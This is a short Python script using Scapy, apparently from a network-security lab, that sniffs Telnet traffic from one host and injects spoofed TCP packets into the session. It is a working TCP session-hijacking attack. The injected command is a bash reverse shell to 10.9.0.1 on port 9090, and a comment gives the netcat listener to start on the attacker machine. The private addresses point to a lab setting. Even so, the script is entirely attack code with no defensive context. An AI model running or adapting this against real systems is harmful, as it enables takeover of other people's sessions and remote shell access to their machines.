#!/usr/bin/env python3
from scapy.all import *
from search_iface_by_prefx import *

interface = search_iface_by_prefx("br-", get_if_list())
print (f'the interface is {interface}')
mac_address = get_if_hwaddr(interface)
print(f'This machine mac address is: {mac_address}')

def handle_sniffing(pkt):
    if(pkt[TCP].flags=="A"):
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                    flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
        #data = '\r mkdir ciao\r'
        # For the reverse shell attack you need to run the following command on
        # the attacker machine before running this script:
        # nc -lnv 9090
        data = '\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r'
        rst_pkt = ip/tcp/data
        send(rst_pkt,verbose=0)
        print(f'hijacking packet sent')
        rst_pkt.show()

pkt = sniff(iface=interface, filter='tcp dst port 23 and src host 10.9.0.7', prn=handle_sniffing)
